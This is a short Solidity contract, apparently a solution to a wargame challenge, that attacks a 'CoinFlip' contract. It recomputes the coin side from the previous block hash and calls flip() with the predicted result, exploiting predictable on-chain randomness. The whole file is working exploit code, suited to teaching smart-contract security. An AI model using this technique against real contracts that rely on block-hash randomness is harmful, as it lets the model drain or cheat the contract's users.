// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";

contract AttackingCoinFlip {
    address public contractAddress;
    
    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        //Re use same calculations as CoinFlip Contract to get correct side.
        uint256 factor =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / factor;
        bool side = coinFlip == 1 ? true : false;
        //Call flip function from CoinFlip contract. You should call once per block.
        CoinFlip(contractAddress).flip(side);
    }
}
